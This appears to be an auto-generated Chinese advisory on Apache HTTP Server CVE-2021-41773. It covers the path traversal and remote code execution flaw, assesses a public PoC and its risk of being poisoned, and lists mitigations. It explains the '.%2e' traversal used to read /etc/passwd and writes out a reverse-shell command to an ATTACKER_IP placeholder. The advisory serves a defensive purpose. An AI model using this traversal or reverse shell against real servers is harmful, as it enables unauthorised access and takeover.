## CVE-2021-41773 Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可读取敏感文件并远程执行代码

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且启用了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用具有较高的有效性。

**有效性：**

*   漏洞库明确指出该漏洞已被在野利用。
*   搜索结果显示该漏洞允许未经身份验证的攻击者读取敏感信息并执行任意代码。
*   提供的POC代码包含利用路径遍历读取`/etc/passwd`文件的脚本以及通过CGI执行反向shell的脚本，证明了漏洞的可利用性。

**投毒风险：**

虽然POC代码本身实现了明确的漏洞利用功能，但考虑到其来源的安全性无法完全保证，仍存在潜在的投毒风险。具体分析如下：

*   代码的功能相对简单直接，主要依赖于`curl`命令发送HTTP请求。潜在的投毒方式可能包括：
    *   **变量替换：** 攻击者可能尝试修改`TARGET_IP`或`ATTACKER_IP`变量，将利用流量引导至恶意服务器。
    *   **命令注入：** 攻击者可能尝试通过修改`URL`或`POST`数据中的参数，实现命令注入，从而执行恶意代码。虽然在提供的代码中直接注入恶意代码的难度较高，但仍然不能完全排除这种可能性。
    *   **依赖库问题：** 虽然POC主要依赖`curl`和`bash`，但如果运行环境存在其他未知的依赖库，可能存在通过这些依赖库进行投毒的风险。

由于代码较为简短，且功能较为直接，恶意代码隐藏的空间有限。因此，投毒风险相对较低，估计在10%左右。

**利用方式：**

该漏洞的利用方式如下：

1.  **路径遍历：** 利用Apache HTTP Server 2.4.49在路径规范化方面的缺陷，通过构造包含`.%2e`的URL，绕过Alias-like指令的限制，访问服务器上的任意文件。如果目标文件没有被"require all denied"等配置保护，则可以成功读取文件内容，例如`/etc/passwd`。
2.  **远程代码执行：** 如果服务器配置允许CGI脚本执行，攻击者可以通过构造特殊的HTTP POST请求，将恶意代码作为CGI脚本的输入，从而在服务器上执行任意命令。例如，可以使用`bash -i >& /dev/tcp/$ATTACKER_IP/$PORT 0>&1`命令建立反向shell，从而完全控制目标服务器。

**防范措施：**

*   升级到Apache HTTP Server 2.4.50或更高版本。
*   配置"require all denied"，限制对敏感文件的访问。
*   禁用不必要的CGI脚本执行。
*   监控服务器日志，及时发现异常请求。

**项目地址:** [khaidtraivch/CVE-2021-41773-Apache-2.4.49-](https://github.com/khaidtraivch/CVE-2021-41773-Apache-2.4.49-)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)